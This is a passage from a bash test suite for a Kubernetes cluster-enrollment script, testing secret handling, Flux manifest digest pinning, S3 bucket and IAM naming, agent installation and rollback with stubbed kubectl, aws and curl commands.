pass "mirror_s3_secret copies the credential to the database namespace"

: >"${WORK}/calls"
PLATFORM_NAMESPACE="everest-system"
DB_NAMESPACE="db-apps"
mirror_s3_secret >/dev/null 2>&1
grep -q "kubectl -n db-apps create secret generic pds-s3" "${WORK}/calls" \
  || fail "mirror_s3_secret did not copy the credential into the enrolled namespace"
pass "mirror_s3_secret uses the enrolled database namespace"
DB_NAMESPACE="pds"

# Nothing to do when the platform already lives there.
: >"${WORK}/calls"
PLATFORM_NAMESPACE="pds" mirror_s3_secret >/dev/null 2>&1
grep -q "create secret" "${WORK}/calls" \
  && fail "mirror_s3_secret copied a secret onto itself"
pass "mirror_s3_secret does nothing when the namespaces match"
PLATFORM_NAMESPACE="everest-system"

# --- resolve_image requires the hub to name one ---
IMAGE="ghcr.io/percona/percona-services-adapter:1.2.3"
resolve_image
[[ "${IMAGE_REPOSITORY}" == "ghcr.io/percona/percona-services-adapter" ]] \
  || fail "resolve_image repository: ${IMAGE_REPOSITORY}"
[[ "${IMAGE_TAG}" == "1.2.3" ]] || fail "resolve_image tag: ${IMAGE_TAG}"
pass "resolve_image reads the hub image"

IMAGE="localhost:5000/percona/adapter"
resolve_image
[[ "${IMAGE_REPOSITORY}" == "localhost:5000/percona/adapter" ]] \
  || fail "resolve_image host:port repository: ${IMAGE_REPOSITORY}"
[[ "${IMAGE_TAG}" == "latest" ]] || fail "resolve_image host:port tag: ${IMAGE_TAG}"
pass "resolve_image keeps a registry port out of the tag"

IMAGE="localhost:5000/percona/adapter:dev"
resolve_image
[[ "${IMAGE_REPOSITORY}" == "localhost:5000/percona/adapter" ]] \
  || fail "resolve_image host:port tagged repository: ${IMAGE_REPOSITORY}"
[[ "${IMAGE_TAG}" == "dev" ]] || fail "resolve_image host:port tagged tag: ${IMAGE_TAG}"
pass "resolve_image still splits a tag after a registry port"

IMAGE="ghcr.io/percona/adapter@sha256:abc"
resolve_image
[[ "${IMAGE_REPOSITORY}" == "ghcr.io/percona/adapter@sha256" ]] \
  || fail "resolve_image digest repository: ${IMAGE_REPOSITORY}"
[[ "${IMAGE_TAG}" == "abc" ]] || fail "resolve_image digest tag: ${IMAGE_TAG}"
pass "resolve_image keeps a digest joinable as repository:tag"

(
  IMAGE=""
  resolve_image 2>/dev/null
) && fail "resolve_image guessed an image the hub did not name"
pass "resolve_image refuses to guess"

# --- no bucket policy is written, in either direction ---
# The grant lives once, in the cluster's IAM user policy. A bucket policy would
# have to name a user that does not exist when the bucket is made, and two
# copies of one grant is how one of them goes stale.
REGION="us-west-2"
: >"${WORK}/calls"
FAKE_HEAD_BUCKET_RC=0 ensure_spoke_bucket "pds-existing" >/dev/null
grep -q "put-bucket-policy" "${WORK}/calls" \
  && fail "ensure_spoke_bucket touched the policy on a pre-existing bucket"
pass "ensure_spoke_bucket leaves an existing bucket alone"

: >"${WORK}/calls"
CREATED_BUCKET=0
FAKE_HEAD_BUCKET_RC=1 ensure_spoke_bucket "pds-fresh" >/dev/null
grep -q "put-bucket-policy" "${WORK}/calls" \
  && fail "ensure_spoke_bucket wrote a bucket policy naming a user that may not exist yet"
grep -q "create-bucket" "${WORK}/calls" \
  || fail "ensure_spoke_bucket did not create the bucket"
pass "ensure_spoke_bucket creates the bucket and grants nothing itself"

# --- a globally taken name says so ---
: >"${WORK}/calls"
out="$(
  FAKE_HEAD_BUCKET_RC=1 \
    FAKE_CREATE_BUCKET_ERR="An error occurred (BucketAlreadyExists) when calling the CreateBucket operation" \
    ensure_spoke_bucket "pds-taken" 2>&1
)" && fail "ensure_spoke_bucket accepted a taken bucket name"
[[ "${out}" == *"global across all"* ]] || fail "no explanation for a taken bucket: ${out}"
pass "ensure_spoke_bucket explains a taken bucket name"

# --- the Flux manifest digest is checked before it is applied ---
# install_flux pipes a GitHub release asset into kubectl with cluster-admin, so
# a replaced asset is arbitrary workloads in a customer cluster. These cover the
# digest gate rather than the install itself.

# The empty string has a known sha256, so this pins the helper to the real
# algorithm rather than to whatever it happens to print.
: >"${WORK}/empty"
[[ "$(sha256_of "${WORK}/empty")" == "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855" ]] \
  || fail "sha256_of is not sha256: $(sha256_of "${WORK}/empty")"
pass "sha256_of returns a sha256"

printf 'flux' >"${WORK}/known"
known_digest="$(sha256_of "${WORK}/known")"

# The same bytes hash the same twice, which is the property the gate relies on.
[[ "$(sha256_of "${WORK}/known")" == "${known_digest}" ]]   || fail "sha256_of is not stable"
pass "sha256_of is stable"

# The pinned default resolves without the operator supplying anything.
FLUX_PINNED_VERSION="2.5.1"
FLUX_PINNED_SHA256="deadbeef"
got="$(FLUX_VERSION="2.5.1" FLUX_SHA256="" flux_expected_digest)" || fail "flux_expected_digest refused the pinned version"
[[ "${got}" == "deadbeef" ]] || fail "flux_expected_digest returned ${got}"
pass "flux_expected_digest resolves the pinned version"

# An explicit override wins, which is what makes a newer Flux installable.
got="$(FLUX_VERSION="9.9.9" FLUX_SHA256="abc123" flux_expected_digest)" || fail "flux_expected_digest refused an explicit digest"
[[ "${got}" == "abc123" ]] || fail "flux_expected_digest ignored the override"
pass "flux_expected_digest takes an explicit digest"

# A version nobody pinned and nobody vouched for must refuse. This is the whole
# point: the manifest is piped into kubectl with cluster-admin.
out="$(FLUX_VERSION="9.9.9" FLUX_SHA256="" flux_expected_digest 2>&1)" && fail "flux_expected_digest accepted an unpinned Flux version"
[[ "${out}" == *"no pinned digest"* ]] || fail "flux_expected_digest did not explain the refusal: ${out}"
pass "flux_expected_digest refuses a version with no pinned digest"

# --- install_flux writes a GitHub HTTPS secret when enrollment sent a password ---
NAME="spoke-a"
GIT_URL="https://github.com/percona-cloud/spoke-a.git"
GIT_USERNAME="x-access-token"
GIT_PASSWORD="ghs_secret"
CREATED_FLUX=0
: >"${WORK}/calls"
: >"${WORK}/applied.yaml"
install_flux >/dev/null
grep -q "create secret generic hub-github" "${WORK}/calls" \
  || fail "install_flux did not create hub-github"
grep -q "from-file=password=" "${WORK}/calls" \
  || fail "install_flux did not pass the enrollment password from a file"
grep -q "ghs_secret" "${WORK}/calls" \
  && fail "install_flux put the git password on the kubectl command line: $(cat "${WORK}/calls")"
grep -q "name: hub-github" "${WORK}/applied.yaml" \
  || fail "install_flux GitRepository missing secretRef"
grep -q "serviceAccountName: hub-instances" "${WORK}/applied.yaml" \
  || fail "install_flux Kustomization missing serviceAccountName"
grep -q "targetNamespace:" "${WORK}/applied.yaml" \
  || fail "install_flux Kustomization missing targetNamespace"
grep -q "kind: ServiceAccount" "${WORK}/applied.yaml" \
  || fail "install_flux did not create the hub-instances service account"
grep -q "kind: Role" "${WORK}/applied.yaml" \
  || fail "install_flux did not create a namespaced Role"
grep -q "kind: ClusterRole" "${WORK}/applied.yaml" \
  && fail "install_flux granted cluster-wide RBAC: $(cat "${WORK}/applied.yaml")"
grep -q "core.openeverest.io" "${WORK}/applied.yaml" \
  || fail "install_flux Role does not name Instance resources"
pass "install_flux creates a Flux GitHub secret"

# PMM comes from hub Git through its own Kustomization, with its own service
# account, because the instances one may only touch Instances.
grep -q "path: clusters/spoke-a/platform$" "${WORK}/applied.yaml" \
  || fail "install_flux did not apply a Kustomization for the platform tree: $(cat "${WORK}/applied.yaml")"
grep -q "serviceAccountName: hub-platform" "${WORK}/applied.yaml" \
  || fail "install_flux platform Kustomization has no service account of its own"
grep -q "targetNamespace: ${PLATFORM_NAMESPACE}$" "${WORK}/applied.yaml" \
  || fail "install_flux platform Kustomization does not target the platform namespace"
grep -q "helmreleases" "${WORK}/applied.yaml" && grep -q "helmrepositories" "${WORK}/applied.yaml" \
  || fail "install_flux hub-platform Role does not name HelmRelease and HelmRepository"
grep -q 'resources: \["configmaps"\]' "${WORK}/applied.yaml" \
  || fail "install_flux hub-platform Role does not name the ConfigMap that holds PMM's alert rules"
grep -q "deploy/helm-controller" "${WORK}/calls" \
  || fail "install_flux did not wait for helm-controller"
pass "install_flux applies the platform Kustomization for PMM"

# A cluster with no amd64 node gets no PMM, so there is nothing to reconcile.
(
  spoke_pmm_enabled() { echo false; }
  : >"${WORK}/applied.yaml"
  install_flux >/dev/null
  grep -q "path: clusters/spoke-a/platform" "${WORK}/applied.yaml" \
    && fail "install_flux applied a platform Kustomization on a cluster without PMM"
  exit 0
) || exit 1
pass "install_flux skips the platform Kustomization when the cluster has no PMM"

GIT_PASSWORD=""
GIT_USERNAME=""
: >"${WORK}/calls"
: >"${WORK}/applied.yaml"
install_flux >/dev/null
grep -q "create secret generic hub-github" "${WORK}/calls" \
  && fail "install_flux created a secret without a password"
grep -q "secretRef" "${WORK}/applied.yaml" \
  && fail "install_flux set secretRef without a password"
pass "install_flux omits Flux git auth when enrollment has no password"

GIT_IDENTITY="-----BEGIN OPENSSH PRIVATE KEY-----
test
-----END OPENSSH PRIVATE KEY-----"
GIT_IDENTITY_PUB="ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAItesthub pds-flux"
GIT_PASSWORD=""
GIT_USERNAME=""
: >"${WORK}/calls"
: >"${WORK}/applied.yaml"
install_flux >/dev/null
grep -q "from-file=identity=" "${WORK}/calls" \
  || fail "install_flux did not write an SSH identity secret"
grep -q "from-file=identity.pub=" "${WORK}/calls" \
  || fail "install_flux did not write identity.pub"
grep -q "from-file=known_hosts=" "${WORK}/calls" \
  || fail "install_flux did not write known_hosts"
grep -q "from-literal=password=" "${WORK}/calls" \
  && fail "install_flux wrote an HTTPS password when an identity was present"
grep -q "name: hub-github" "${WORK}/applied.yaml" \
  || fail "install_flux GitRepository missing secretRef for SSH"
pass "install_flux creates a Flux SSH identity secret"

CREATED_FLUX=0
mark_created_flux
[[ "$CREATED_FLUX" == 0 ]] || fail "mark_created_flux treated an existing flux-system as new"
pass "mark_created_flux leaves a pre-existing Flux namespace unmarked"

CREATED_FLUX=0
FAKE_MISSING_NAMESPACES="flux-system" mark_created_flux
[[ "$CREATED_FLUX" == 1 ]] || fail "mark_created_flux did not mark a new flux-system"
pass "mark_created_flux marks a flux-system this run created"

cat >"${FAKE}/curl" <<EOF
#!/usr/bin/env bash
echo "curl \$*" >>"${WORK}/calls"
prev=""
for arg in "\$@"; do
  if [[ "\$prev" == "-o" ]]; then
    : >"\$arg"
  fi
  prev="\$arg"
done
exit 0
EOF
chmod +x "${FAKE}/curl"

CREATED_FLUX=0
APPLIED_FLUX=0
FLUX_APPLIED_NAMES=""
: >"${WORK}/calls"
FAKE_MISSING_CRDS="gitrepositories.source.toolkit.fluxcd.io" FLUX_SHA256="skip" \
  FLUX_VERSION="2.5.1" install_flux >/dev/null
[[ "$CREATED_FLUX" == 0 ]] || fail "install_flux took a leftover flux-system namespace"
[[ "$APPLIED_FLUX" == 1 ]] || fail "install_flux did not record applying Flux into a leftover namespace"
[[ -n "$FLUX_APPLIED_NAMES" && -f "$FLUX_APPLIED_NAMES" ]] \
  || fail "install_flux did not keep the names it applied"
pass "install_flux applies Flux without owning a leftover flux-system namespace"

# Every on_exit test from here to the failure policy section exercises the
# rollback machinery, which now runs only when it is asked for. Keep is the
# default, so these set the policy the behaviour they assert belongs to.
ON_FAILURE="rollback"
INTERRUPTED=0

CREATED_CLUSTER=0
CREATED_NODEGROUP=0
CREATED_BUCKET=0
CREATED_AGENT=0
INSTALLED_PLATFORM=0
CREATED_IAM_USER=0
CREATED_FLUX=0
APPLIED_FLUX=1
FLUX_APPLIED_NAMES="${WORK}/flux-applied"
printf '%s\n' "namespace/flux-system" "deployment.apps/source-controller" >"$FLUX_APPLIED_NAMES"
NAME="spoke-a"
REGION="us-west-2"
tmp="${WORK}/scratch"
mkdir -p "$tmp"
: >"${WORK}/calls"
(
  false
  on_exit
) || true
grep -q "delete namespace flux-system" "${WORK}/calls" \
  && fail "on_exit deleted a leftover flux-system namespace: $(cat "${WORK}/calls")"
grep -q "delete namespace/flux-system" "${WORK}/calls" \
  && fail "on_exit deleted a leftover flux-system namespace object: $(cat "${WORK}/calls")"
grep -q "delete deployment.apps/source-controller" "${WORK}/calls" \
  || fail "on_exit left Flux controllers applied into a leftover namespace: $(cat "${WORK}/calls")"
pass "on_exit removes Flux this run applied without deleting a leftover namespace"

CREATED_CLUSTER=0
CREATED_NODEGROUP=0
CREATED_BUCKET=0
CREATED_AGENT=0
INSTALLED_PLATFORM=0
CREATED_IAM_USER=0
CREATED_FLUX=1
APPLIED_FLUX=1
FLUX_APPLIED_NAMES="${WORK}/flux-applied-owned"
printf '%s\n' \
  "namespace/flux-system" \
  "customresourcedefinition.apiextensions.k8s.io/gitrepositories.source.toolkit.fluxcd.io" \
  "clusterrole.rbac.authorization.k8s.io/crd-controller-flux-system" \
  >"$FLUX_APPLIED_NAMES"
: >"${WORK}/calls"
(
  false
  on_exit
) || true
grep -q "delete customresourcedefinition.apiextensions.k8s.io/gitrepositories.source.toolkit.fluxcd.io" "${WORK}/calls" \
  || fail "on_exit left Flux CRDs after deleting flux-system: $(cat "${WORK}/calls")"
grep -q "delete clusterrole.rbac.authorization.k8s.io/crd-controller-flux-system" "${WORK}/calls" \
  || fail "on_exit left Flux ClusterRoles after deleting flux-system: $(cat "${WORK}/calls")"
pass "on_exit removes cluster-scoped Flux objects this run applied"

CREATED_FLUX=0
APPLIED_FLUX=0
: >"${WORK}/calls"
FAKE_MISSING_DEPLOYS="source-controller" FLUX_SHA256="skip" FLUX_VERSION="2.5.1" \
  install_flux >/dev/null
[[ "$APPLIED_FLUX" == 1 ]] \
  || fail "install_flux skipped a leftover Flux CRD with no controllers"
pass "install_flux repairs Flux when controllers are missing"

CREATED_FLUX=0
APPLIED_FLUX=0
: >"${WORK}/calls"
FLUX_SHA256="skip" FLUX_VERSION="2.5.1" install_flux >/dev/null
[[ "$APPLIED_FLUX" == 0 ]] || fail "install_flux reapplied a healthy Flux install"
if grep -q -- "-o name" "${WORK}/calls"; then
  fail "install_flux applied install.yaml onto a healthy Flux: $(cat "${WORK}/calls")"
fi
pass "install_flux leaves a healthy Flux install alone"

CREATED_FLUX=0
APPLIED_FLUX=0
FLUX_APPLIED_NAMES="${WORK}/partial-flux-names"
: >"$FLUX_APPLIED_NAMES"
: >"${WORK}/calls"
if (
  trap - EXIT
  FAKE_MISSING_CRDS="gitrepositories.source.toolkit.fluxcd.io" \
    FAKE_APPLY_RC=1 FLUX_SHA256="skip" FLUX_VERSION="2.5.1" \
    FLUX_APPLIED_NAMES="$FLUX_APPLIED_NAMES" \
    install_flux >/dev/null 2>"${WORK}/apply.err"
); then
  fail "install_flux ignored a failed Flux apply"
fi
[[ -s "$FLUX_APPLIED_NAMES" ]] \
  || fail "install_flux dropped the names from a failed apply"
pass "install_flux records names when Flux apply fails"

FAKE_MISSING_CRDS=""
FLUX_SHA256=""
APPLIED_FLUX=0
FLUX_APPLIED_NAMES=""

CREATED_FLUX=1
CREATED_CLUSTER=0
CREATED_NODEGROUP=0
CREATED_BUCKET=0
CREATED_AGENT=0
INSTALLED_PLATFORM=0
CREATED_IAM_USER=0
CREATED_ACCESS_KEY_ID=""
NAME="spoke-a"
REGION="us-west-2"
tmp="${WORK}/scratch"
mkdir -p "$tmp"
: >"${WORK}/calls"
(
  false
  on_exit
) || true
grep -q "delete namespace flux-system" "${WORK}/calls" \
  || fail "on_exit left a flux-system this run created: $(cat "${WORK}/calls")"
pass "on_exit deletes a flux-system this run created"

CREATED_FLUX=0
: >"${WORK}/calls"
(
  false
  on_exit
) || true
grep -q "delete namespace flux-system" "${WORK}/calls" \
  && fail "on_exit deleted a pre-existing flux-system: $(cat "${WORK}/calls")"
pass "on_exit keeps a pre-existing flux-system"

GIT_IDENTITY=""
GIT_IDENTITY_PUB=""
mkdir -p "$tmp"

# --- private GHCR agent images pull with the hub token ---
IMAGE_REPOSITORY="ghcr.io/example/pds-adapter"
IMAGE_TAG="github-hub"
REGISTRY_SERVER="ghcr.io"
REGISTRY_USERNAME="x-access-token"
REGISTRY_PASSWORD="ghs_secret"
REGISTRY_PULL_SECRET_NAME="ghcr-pull"
PLATFORM_NAMESPACE="everest-system"
: >"${WORK}/calls"
ensure_registry_pull_secret "$PLATFORM_NAMESPACE" >/dev/null
grep -q "create secret generic ghcr-pull" "${WORK}/calls" \
  || fail "ensure_registry_pull_secret did not create a dockerconfigjson secret"
grep -q "from-file=.dockerconfigjson=" "${WORK}/calls" \
  || fail "ensure_registry_pull_secret did not load dockerconfig from a file"
grep -q "ghs_secret" "${WORK}/calls" \
  && fail "ensure_registry_pull_secret put the GHCR password on a command line: $(cat "${WORK}/calls")"
pass "ensure_registry_pull_secret creates a GHCR pull secret"

REGISTRY_PASSWORD=""
: >"${WORK}/calls"
ensure_registry_pull_secret "$PLATFORM_NAMESPACE" >/dev/null
grep -q "create secret docker-registry" "${WORK}/calls" \
  && fail "ensure_registry_pull_secret created a secret without a password"
grep -q "from-file=.dockerconfigjson=" "${WORK}/calls" \
  && fail "ensure_registry_pull_secret created a secret without a password"
pass "ensure_registry_pull_secret skips when enrollment has no password"

REGISTRY_PASSWORD="ghs_secret"
IMAGE_REPOSITORY="123456789012.dkr.ecr.us-west-2.amazonaws.com/pds-adapter"
: >"${WORK}/calls"
ensure_registry_pull_secret "$PLATFORM_NAMESPACE" >/dev/null
grep -q "create secret docker-registry" "${WORK}/calls" \
  && fail "ensure_registry_pull_secret used a GitHub token against ECR"
pass "ensure_registry_pull_secret skips non-GHCR images"

IMAGE_REPOSITORY="ghcr.io/example/pds-adapter"
spoke="${WORK}/spoke.yaml"
: >"${spoke}"
write_spoke_registry_pull_secret "${spoke}"
grep -q "imagePullSecrets:" "${spoke}" \
  || fail "write_spoke_registry_pull_secret did not set imagePullSecrets"
grep -q "name: ghcr-pull" "${spoke}" \
  || fail "write_spoke_registry_pull_secret did not name ghcr-pull"
pass "write_spoke_registry_pull_secret writes Helm imagePullSecrets"

IMAGE_REPOSITORY="123456789012.dkr.ecr.us-west-2.amazonaws.com/pds-adapter"
: >"${spoke}"
write_spoke_registry_pull_secret "${spoke}"
grep -q "imagePullSecrets:" "${spoke}" \
  && fail "write_spoke_registry_pull_secret set imagePullSecrets for ECR"
pass "write_spoke_registry_pull_secret omits Helm pull secrets for non-GHCR"

IMAGE_REPOSITORY="ghcr.io/example/pds-adapter"
NAME="spoke-a"
RELEASE="pds-agent"
AGENT_NAMESPACE="pds-agent"
HUB_URL="http://hub.example"
TOKEN="jnt_test"
: >"${WORK}/calls"
: >"${WORK}/applied.yaml"
install_agent >/dev/null
grep -q "create secret generic ghcr-pull" "${WORK}/calls" \
  || fail "install_agent did not create a pull secret in the agent namespace"
grep -q "from-file=HUB_AGENT_TOKEN=" "${WORK}/calls" \
  || fail "install_agent did not load the hub token from a file"
grep -q "jnt_test" "${WORK}/calls" \
  && fail "install_agent put the hub token on the kubectl command line: $(cat "${WORK}/calls")"
grep -q "imagePullSecrets:" "${WORK}/applied.yaml" \
  || fail "install_agent Deployment missing imagePullSecrets"
grep -q "name: ghcr-pull" "${WORK}/applied.yaml" \
  || fail "install_agent Deployment missing ghcr-pull"
grep -q "secretKeyRef:" "${WORK}/applied.yaml" \
  || fail "install_agent put the hub token in Deployment env"
grep -q "name: pds-hub-agent-token" "${WORK}/applied.yaml" \
  || fail "install_agent Deployment missing the hub token Secret"
grep -q 'value: "jnt_test"' "${WORK}/applied.yaml" \
  && fail "install_agent inlined the hub token in the Deployment"
grep -q 'value: "pds"' "${WORK}/applied.yaml" \
  || fail "install_agent defaulted EVEREST_NAMESPACE"
grep -A1 -x '            - name: ENVIRONMENT_NAME' "${WORK}/applied.yaml" | grep -qxF '              value: "spoke-a"' \
  || fail "install_agent Deployment did not name the environment through ENVIRONMENT_NAME"
grep -q 'CLUSTER_NAME' "${WORK}/applied.yaml" \
  && fail "install_agent Deployment still sets CLUSTER_NAME"
pass "install_agent pulls private GHCR with the hub token"

DB_NAMESPACE="db-apps"
: >"${WORK}/applied.yaml"
install_agent >/dev/null
grep -q 'value: "db-apps"' "${WORK}/applied.yaml" \
  || fail "install_agent ignored the enrolled database namespace"
pass "install_agent uses the enrolled database namespace"
DB_NAMESPACE="pds"

REGISTRY_PASSWORD=""
: >"${WORK}/calls"
: >"${WORK}/applied.yaml"
install_agent >/dev/null
grep -q "create secret generic ghcr-pull" "${WORK}/calls" \
  && fail "install_agent created a pull secret without a password"
grep -q "imagePullSecrets:" "${WORK}/applied.yaml" \
  && fail "install_agent set imagePullSecrets without a password"
pass "install_agent omits a pull secret when enrollment has no password"

CREATED_AGENT=0
FAKE_MISSING_NAMESPACES="pds-agent" install_agent >/dev/null
[[ "$CREATED_AGENT" == 1 ]] || fail "install_agent did not mark a new agent namespace"
pass "install_agent marks a namespace this run created"

CREATED_AGENT=0
install_agent >/dev/null
[[ "$CREATED_AGENT" == 0 ]] || fail "install_agent marked a pre-existing agent namespace"
pass "install_agent leaves a pre-existing agent namespace unmarked"

CREATED_CLUSTER=0
CREATED_NODEGROUP=0
CREATED_BUCKET=0
CREATED_FLUX=0
CREATED_AGENT=1
INSTALLED_PLATFORM=0
CREATED_IAM_USER=0
CREATED_ACCESS_KEY_ID=""
tmp="${WORK}/scratch"
mkdir -p "$tmp"
: >"${WORK}/calls"
(
  false
  on_exit
) || true
grep -q "delete namespace pds-agent" "${WORK}/calls" \
  || fail "on_exit left an agent namespace this run created: $(cat "${WORK}/calls")"
pass "on_exit deletes an agent namespace this run created"

CREATED_AGENT=0
: >"${WORK}/calls"
(
  false
  on_exit
) || true
grep -q "delete namespace pds-agent" "${WORK}/calls" \
  && fail "on_exit deleted a pre-existing agent namespace: $(cat "${WORK}/calls")"
pass "on_exit keeps a pre-existing agent namespace"

# --- AWS resource names stay inside S3's 63-character bucket limit ---
NAME="spoke-a"
[[ "$(spoke_aws_name)" == "pds-spoke-a" ]] || fail "spoke_aws_name short: $(spoke_aws_name)"
pass "spoke_aws_name keeps a short cluster name"

NAME="$(python3 -c 'print("a" + "x"*61 + "a")')"
[[ "${#NAME}" -eq 63 ]] || fail "long cluster name fixture is ${#NAME}"
got="$(spoke_aws_name)"
[[ "${#got}" -le 63 ]] || fail "spoke_aws_name exceeded 63: ${got} (${#got})"
[[ "$got" == pds-* ]] || fail "spoke_aws_name lost the prefix: ${got}"
[[ "$got" != "pds-${NAME}" ]] || fail "spoke_aws_name did not bound a 63-character cluster name"
pass "spoke_aws_name bounds a 63-character cluster name"

NAME="spoke-a"
[[ "$(spoke_bucket_name)" == "pds-123456789012-spoke-a" ]] \
  || fail "spoke_bucket_name: $(spoke_bucket_name)"
pass "spoke_bucket_name includes the AWS account id"

export FAKE_AWS_ACCOUNT="999999999999"
[[ "$(spoke_bucket_name)" == "pds-999999999999-spoke-a" ]] \
  || fail "spoke_bucket_name ignored the account: $(spoke_bucket_name)"
unset FAKE_AWS_ACCOUNT
pass "spoke_bucket_name differs across AWS accounts"

NAME="prod"
BUCKET=""
REGION="us-west-2"
export FAKE_EXISTING_BUCKETS="pds-prod"
got="$(resolve_spoke_bucket)"
unset FAKE_EXISTING_BUCKETS
[[ "$got" == "pds-prod" ]] || fail "resolve_spoke_bucket dropped a legacy bucket: ${got}"
pass "resolve_spoke_bucket keeps a pre-account-id bucket"

NAME="prod"
BUCKET=""
got="$(resolve_spoke_bucket)"
[[ "$got" == "pds-123456789012-prod" ]] || fail "resolve_spoke_bucket default: ${got}"
pass "resolve_spoke_bucket defaults to an account-scoped name"

# A spoke that joined before the product was renamed to PDS keeps the bucket
# its backups are already in, and the IAM user whose key writes to it. Both are
# looked up only: a repair converges rather than provisioning a second set.
NAME="prod"
BUCKET=""
REGION="us-west-2"
export FAKE_EXISTING_BUCKETS="basecamp-123456789012-prod" # allow-legacy-name
got="$(resolve_spoke_bucket)"
unset FAKE_EXISTING_BUCKETS
want="basecamp-123456789012-prod" # allow-legacy-name
[[ "$got" == "$want" ]] \
  || fail "resolve_spoke_bucket orphaned a bucket from before the rename: ${got}"
pass "resolve_spoke_bucket keeps an account-scoped bucket from before the rename"

export FAKE_EXISTING_BUCKETS="basecamp-prod" # allow-legacy-name
got="$(resolve_spoke_bucket)"
unset FAKE_EXISTING_BUCKETS
want="basecamp-prod" # allow-legacy-name
[[ "$got" == "$want" ]] \
  || fail "resolve_spoke_bucket orphaned a global bucket from before the rename: ${got}"
pass "resolve_spoke_bucket keeps a global bucket from before the rename"

# The tag, on that user and no other, is the only thing that can answer here:
# no policy is present under either name.
export FAKE_EXISTING_USERS="basecamp-prod" # allow-legacy-name
export FAKE_USER_TAGS="basecamp-prod:basecamp" # allow-legacy-name
export FAKE_USER_POLICIES="none:none"
got="$(spoke_iam_user)"
unset FAKE_EXISTING_USERS FAKE_USER_TAGS FAKE_USER_POLICIES
want="basecamp-prod" # allow-legacy-name
[[ "$got" == "$want" ]] \
  || fail "spoke_iam_user minted a second user for a spoke from before the rename: ${got}"
pass "spoke_iam_user reuses a user tagged before the rename"

# The inline policy under its pre-rename name is the other ownership mark, and
# it is the only one present here.
export FAKE_EXISTING_USERS="basecamp-prod" # allow-legacy-name
export FAKE_USER_TAGS="basecamp-prod:someone-else" # allow-legacy-name
export FAKE_USER_POLICIES="basecamp-prod:basecamp-backup-storage" # allow-legacy-name
got="$(spoke_iam_user)"
unset FAKE_EXISTING_USERS FAKE_USER_TAGS FAKE_USER_POLICIES
want="basecamp-prod" # allow-legacy-name
[[ "$got" == "$want" ]] \
  || fail "spoke_iam_user ignored the backup policy from before the rename: ${got}"
pass "spoke_iam_user reuses a user carrying the pre-rename backup policy"

export FAKE_EXISTING_USERS="basecamp-prod" # allow-legacy-name
export FAKE_USER_TAGS="basecamp-prod:someone-else" # allow-legacy-name
export FAKE_USER_POLICIES="none:none"
got="$(spoke_iam_user)"
unset FAKE_EXISTING_USERS FAKE_USER_TAGS FAKE_USER_POLICIES
[[ "$got" == "pds-prod" ]] \
  || fail "spoke_iam_user adopted a user it does not own: ${got}"
pass "spoke_iam_user leaves a user it does not own alone"

export FAKE_EXISTING_BUCKETS="pds-123456789012-prod basecamp-123456789012-prod" # allow-legacy-name
got="$(resolve_spoke_bucket)"
unset FAKE_EXISTING_BUCKETS
[[ "$got" == "pds-123456789012-prod" ]] \
  || fail "resolve_spoke_bucket preferred a bucket from before the rename: ${got}"
pass "resolve_spoke_bucket prefers the current name when both exist"

export FAKE_EXISTING_USERS="pds-prod basecamp-prod" # allow-legacy-name
got="$(spoke_iam_user)"
unset FAKE_EXISTING_USERS
[[ "$got" == "pds-prod" ]] \
  || fail "spoke_iam_user preferred the old name: ${got}"
pass "spoke_iam_user prefers the current name when both exist"

NAME="prod"
REGION="us-west-2"
export FAKE_IAM_ROLES="eksctl-prod-old-nodegroup-ng-NodeInstanceRole-OLD eksctl-prod-nodegroup-workers-NodeInstanceRole-NEW"
export FAKE_NODEGROUPS="workers"
export FAKE_NODE_ROLE_ARN="arn:aws:iam::123456789012:role/eksctl-prod-nodegroup-workers-NodeInstanceRole-NEW"
: >"${WORK}/calls"
ensure_ebs_csi_iam >/dev/null
grep -q "iam list-roles" "${WORK}/calls" \
  && fail "ensure_ebs_csi_iam listed IAM roles by name substring: $(cat "${WORK}/calls")"
grep -q "attach-role-policy --role-name eksctl-prod-nodegroup-workers-NodeInstanceRole-NEW" "${WORK}/calls" \
  && fail "ensure_ebs_csi_iam attached the CSI policy to a node role: $(cat "${WORK}/calls")"
grep -q "create iamserviceaccount" "${WORK}/calls" \
  || fail "ensure_ebs_csi_iam did not create the CSI IRSA role: $(cat "${WORK}/calls")"
pass "ensure_ebs_csi_iam uses IRSA and not the node role"
unset FAKE_IAM_ROLES FAKE_NODEGROUPS FAKE_NODE_ROLE_ARN

# --- the join tags what it creates, so a cleanup can ask the account ---
# A finished join deletes its state file, so the cleanup guide has only names
# to go on unless every resource carries the cluster it belongs to.
NAME="spoke-a"
REGION="us-west-2"
tmp="${WORK}/scratch"
mkdir -p "$tmp"
KUBERNETES_VERSION="1.31" write_new_cluster_config >/dev/null
got="$(grep -c 'percona.com/pds: "spoke-a"' "${tmp}/cluster.yaml" || true)"
[[ "$got" == 2 ]] \
  || fail "the new cluster config tags ${got} places, want the cluster and the node group: $(cat "${tmp}/cluster.yaml")"
awk '/^metadata:/ {m=1} /^iam:/ {m=0} m && /tags:/ {found=1} END {exit found ? 0 : 1}' "${tmp}/cluster.yaml" \
  || fail "the cluster tag is not under metadata: $(cat "${tmp}/cluster.yaml")"
awk '/managedNodeGroups:/ {g=1} g && /tags:/ {found=1} END {exit found ? 0 : 1}' "${tmp}/cluster.yaml" \
  || fail "the node group carries no tags: $(cat "${tmp}/cluster.yaml")"
pass "the new cluster config tags the cluster and its node group"

rm -f "${tmp}/cluster.yaml"
# Called by name: a stub of the same name further down replaces the real
# function for later tests, and shellcheck reads a direct call as a use before
# its definition.
nodegroup_config=write_nodegroup_config
"$nodegroup_config"
got="$(grep -c 'percona.com/pds: "spoke-a"' "${tmp}/cluster.yaml" || true)"
[[ "$got" == 2 ]] \
  || fail "the node group config tags ${got} places, want metadata and the node group: $(cat "${tmp}/cluster.yaml")"
pass "the node group added to an existing cluster is tagged"

NAME="spoke-a"

# --- a failed run deletes the IAM identity this run created ---
CREATED_CLUSTER=0
CREATED_NODEGROUP=0
CREATED_BUCKET=0
CREATED_FLUX=0
CREATED_AGENT=0
INSTALLED_PLATFORM=1
CREATED_IAM_USER=1
CREATED_ACCESS_KEY_ID="AKIATHISRUN00000000"
PLATFORM_RELEASE="pds"
PLATFORM_NAMESPACE="everest-system"
NAME="spoke-a"
REGION="us-west-2"
tmp="${WORK}/scratch"
mkdir -p "$tmp"
: >"${WORK}/calls"
(
  false
  on_exit
) || true
grep -q "iam delete-access-key --user-name pds-spoke-a --access-key-id AKIATHISRUN00000000" "${WORK}/calls" \
